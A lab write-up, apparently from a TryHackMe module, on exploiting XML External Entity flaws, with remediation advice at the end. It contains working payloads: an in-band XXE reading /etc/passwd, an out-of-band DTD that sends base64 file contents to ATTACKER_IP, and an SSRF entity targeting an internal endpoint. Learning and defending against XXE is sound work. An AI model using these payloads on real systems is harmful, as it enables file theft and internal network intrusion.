# XXE (XML External Entity) — TryHackMe - Web Application Pentesting  
**Date:** 2025-10-25  
**Type:** TryHackMe / Classroom  
**Scope:** Lab / Authorized only

---

## 1) Context  
Exploiting XML External Entities (XXE).  
XXE is a vulnerability where an application parses attacker-controlled XML that declares external entities. If the XML parser is misconfigured, the attacker can force the server to read local files, make internal HTTP requests (SSRF), or even leak data out-of-band.

## 2) Initial hypothesis  
I knew XXE had something to do with “reading files via XML,” but I didn’t fully get:
- What it means for a server to “parse” XML.
- How `&xxe;` could become `/etc/passwd`.
- Why DTDs (`<!DOCTYPE ...>`) matter.

Hypothesis I tested: if the XML parser expands external entities, I should be able to get sensitive content from the filesystem or internal network, even without code execution.

## 3) Tools used  
- Burp Suite (to intercept/modify XML requests)  
- Simple local HTTP listener (for OOB-style thinking)  
- Browser devtools / manual crafted XML  
— No credentials, secrets, or internal hostnames are included here.

## 4) Approach (high level)  
- Reviewed how XML is structured (elements, attributes, entities).  
- Looked at how DTDs define entities and how those entities get expanded.  
- Injected a custom `<!DOCTYPE>` block that declares an external entity pointing to a sensitive resource (like `/etc/passwd`).  
- Sent that XML to the target and observed how the server responded:
  - If content comes back → in-band XXE confirmed.
  - If not, reasoned about out-of-band (OOB) exfiltration via forcing the server to call back to an attacker-controlled server.  
- Explored how XXE can pivot into SSRF by referencing internal URLs instead of local files.

## 5) Results / Evidence (sanitized)  
### XML / DTD fundamentals
- XML is hierarchical data (`<tag>value</tag>`).  
- DTD (Document Type Definition) can declare rules and entities for that XML.  
- Entities are placeholders like variables. When the parser sees `&name;`, it swaps it for whatever `name` was defined as.

### Key moving parts of XXE
<!ENTITY xxe SYSTEM "file:///etc/passwd">
- Defines an entity called xxe whose value is the content of /etc/passwd.
- Entity usage in the body:
    - <name>&xxe;</name>
- Tells the parser to replace &xxe; with the actual contents of that file.
- Parser behavior:
    - If external entity resolution is allowed, the parser reads /etc/passwd and injects its content.
    - If the app reflects <name> in the HTTP response, the file content is leaked — in-band XXE.
- Corrected in-band XXE payload (sanitized)
''' 
<?xml version="1.0"?>
<!DOCTYPE contact [
  <!ELEMENT contact ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
'''

- <!DOCTYPE contact [...]> → DTD explicitly tied to root element <contact>...</contact>
- <!ELEMENT contact ANY> → accept any content inside <contact>
- <!ENTITY xxe SYSTEM "file:///etc/passwd"> → define the external entity
- <name>&xxe;</name> → trigger expansion

- Observed effect (conceptual):
    - The app tried to resolve the entity and include /etc/passwd in its response. That confirmed in-band XXE — direct leakage of local file content.

### Out-of-band (OOB) XXE
- If the app doesn’t reflect anything back, you can still exfiltrate data using a remote DTD and an attacker-controlled server.
- Malicious external DTD:
'''
    <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
    %oobxxe;
'''

- Main XML referencing it:
'''
    <!DOCTYPE contact SYSTEM "http://ATTACKER_IP:1337/payload.dtd">
    <contact>&exfil;</contact>
'''

- What happens:
    - %cmd reads /etc/passwd and base64-encodes it.
    - %oobxxe builds an entity that points to your server.
    - The parser fetches http://ATTACKER_IP:1337/?data=<base64_of_/etc/passwd> — exfiltrating data even if it’s not reflected.
    - You read it from your listener logs.
- This is OOB XXE — indirect exfiltration through an outbound request.

### SSRF via XXE
- You can turn XXE into SSRF by referencing internal URLs instead of local files.
'''
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal/endpoint">
'''

- If the parser resolves this, the vulnerable server sends a request to its internal network. This can expose metadata endpoints, internal dashboards, or other private services.

## 6) Recommended remediation
- Disable external entity resolution / DTDs in the XML parser.
- Use hardened libraries: defusedxml (Python), secure XmlReaderSettings (C#), secure DocumentBuilderFactory (Java) with appropriate flags.
- Validate input and reject XML containing <!DOCTYPE> or external entities.
- Restrict network egress from apps that parse XML to prevent SSRF / OOB.
- Enforce least privilege: the service parsing XML should have minimal FS and network access.
- Keep parsers updated and include XXE cases in pentests, especially for SOAP/XSLT/legacy endpoints.

## 7) Lessons learned
- XXE is entity expansion abuse — &xxe; gets replaced by what it points to.
- The DTD’s root (<!DOCTYPE contact>) must match the document’s root element (<contact>). Mismatch breaks the attack.
- Two attack modes:
    - In-band: response contains the expanded data.
    - Out-of-band: data is exfiltrated via network callbacks.
- XXE can act as SSRF — forcing internal HTTP calls.
- <!ELEMENT contact ANY> helps accept payloads by relaxing structure.
- Disabling DTDs/entity resolution is the main remediation.

---

## 8) Links / Resources
- TryHackMe — Web Application Pentesting (XXE module)
- OWASP XXE Prevention Cheat Sheet
- Secure XML parser configuration guides (Java, .NET, Python)
- Personal Notion write-up (public, if published)

---